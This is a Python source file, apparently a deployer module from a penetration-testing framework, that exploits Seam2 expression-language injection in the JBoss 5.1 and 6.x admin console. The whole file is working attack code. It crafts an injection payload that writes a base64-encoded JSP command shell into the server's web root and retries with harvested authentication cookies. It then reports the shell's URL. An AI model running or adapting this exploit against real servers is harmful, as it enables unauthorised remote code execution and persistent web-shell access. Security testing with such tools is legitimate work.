from src.platform.jboss.interfaces import JINTERFACES
from src.platform.jboss.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from os.path import abspath
from log import LOG
from urllib import quote_plus
from random import choice
from string import ascii_lowercase
from base64 import b64encode
import utility

title = JINTERFACES.WM
versions = ['5.1', '6.0', '6.1']
def deploy(fingerengine, fingerprint):
    """ Exploits Seam2 exposed by certain JBoss installs. Here we
    require the use of a JSP payload that's written into the www root.  The 5.1
    deployer here varies slightly from the Metasploit version, which doesn't appear to
    have been tested against 5.1.  JBoss 5.1 writes into a cached temp, which is regenerated
    every time that war folder is modified.  This kills the shell.

    JBoss 6.0/6.1 is the same, however, and appears to work fine.

    https://www.exploit-db.com/exploits/36653/
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = parse_war_path(war_file)
    if '.war' in war_file:
        tmp = utility.capture_input('This deployer requires a JSP, default to cmd.jsp? [Y/n]')
        if 'n' in tmp.lower():
            return

        war_file = abspath('./src/lib/resources/cmd.jsp')
        war_name = 'cmd'

    utility.Msg("Preparing to deploy {0}...".format(war_name))

    headers = {"Content-Type":"application/x-www-form-urlencoded"}
    jsp_name = ''.join(choice(ascii_lowercase) for _ in range(5)) + '.jsp'
    jsp = None

    try:
        with open(war_file) as f:
            jsp = f.read()
    except Exception, e:
        utility.Msg("Error reading payload file '%s': %s" % (war_file, e), LOG.ERROR)
        return False

    url = 'http://{0}:{1}/admin-console/login.seam'
    uri = 'actionOutcome=/success.xhtml?user%3d%23{{expressions.getClass().'
    uri += 'forName(\'java.io.FileOutputStream\').getConstructor(\''
    uri += 'java.lang.String\',expressions.getClass().forName(\''
    uri += 'java.lang.Boolean\').getField(\'TYPE\').get(null))'
    if fingerprint.version in ['6.0', '6.1']:
        uri += '.newInstance(request.getRealPath(\'/{0}\')'
    else:
        uri += '.newInstance(request.getRealPath(\'/../../../deploy/ROOT.war/{0}\')'
    uri += '.replaceAll(\'\\\\\\\\\',\'/\'),false).write(expressions'
    uri += '.getClass().forName(\'sun.misc.BASE64Decoder\').'
    uri += 'getConstructor(null).newInstance(null).decodeBuffer'
    uri += '(request.getParameter(\'c\'))).close()}}&c={1}'
    uri = uri.format(jsp_name, quote_plus(b64encode(jsp)))

    response = utility.requests_post(url.format(fingerengine.options.ip, fingerprint.port),
                                    data = uri, headers=headers, allow_redirects=False)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth" % 
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            try:
                response = utility.requests_post(url, data = uri,
                                                 cookies=cookies[0], auth=cookies[1])
            except Exception, e:
                utility.Msg("Error with authenticated request: %s" % str(e), LOG.ERROR)
                return
        else:
            utility.Msg("Could not get auth for %s:%s" %
                                    (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if response.status_code == 302:
        if fingerprint.version in ['6.0', '6.1']:
            invoke_url = "http://{0}:{1}/admin-console/{2}".format(fingerengine.options.ip, fingerprint.port, jsp_name)
        else:
            invoke_url = "http://{0}:{1}/{2}".format(fingerengine.options.ip, fingerprint.port, jsp_name)

        utility.Msg("{0} deployed to {1}".format(war_name, invoke_url), LOG.SUCCESS)
        fingerengine.invoke_url = invoke_url
        fingerengine.options.deploy = jsp_name

    else:
        utility.Msg("Failed to deploy {0} (HTTP {1})".format(fingerengine.options.ip,
                                                             response.status_code),
                                                     LOG.ERROR)